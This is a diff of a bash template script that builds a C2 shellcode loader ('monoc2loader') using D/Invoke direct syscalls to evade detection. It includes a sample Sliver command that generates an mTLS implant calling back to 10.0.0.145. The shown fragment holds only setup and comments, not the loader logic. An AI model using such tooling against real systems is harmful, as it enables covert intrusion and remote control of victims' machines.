@@ -1,9 +1,15 @@
 #!/bin/bash
 
-## Version 0.2, using D/Invoke with direct syscalls
-## Using sliver shellcode directly without donut 
+### 
+### Search [!!!] and fill in all the parameters
+###
 
-## lhost and lport are not in use for this script, make sure arch is correct
+## Version 0.2, using D/Invoke with direct syscalls
+## Using a c2 shellcode directly without donut
+## This is a template bash file
+
+## parameter inputs, make sure fill in the following parameters correctly
+## [!!!] lhost and lport are not in use for this script, make sure arch and c2type are correct
 lhost="10.0.0.145"
 lport="8888"
 arch="x64"
@@ -17,7 +23,7 @@ echo 'c2type:'$c2type
 mkdir tmp
 mkdir output
 
-### To Generate a Sliver implant shellcode without obfuscation:
+### To Generate a c2 shellcode (raw bin) payload without obfuscation, the following use sliver as example:
 # [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
 # [*] Generating new windows/amd64 implant binary
 # [!] Symbol obfuscation is disabled
@@ -26,7 +32,9 @@ mkdir output
 #
 ### Move the sliver.bin to folder input if required, then run the autogen script.
 
+# [!!!] this file name can be any but have to be same as your c2 shellcode payload file in the input folder:
 rawscfilename='sliver.bin'
+
 rawscfilename_enc=$rawscfilename'.enc'
 final_cs_filename = 'monoc2loader_'$c2type'.cs'
 final_exe_filename = 'monoc2loader_'$c2type'_'$arch'.exe'
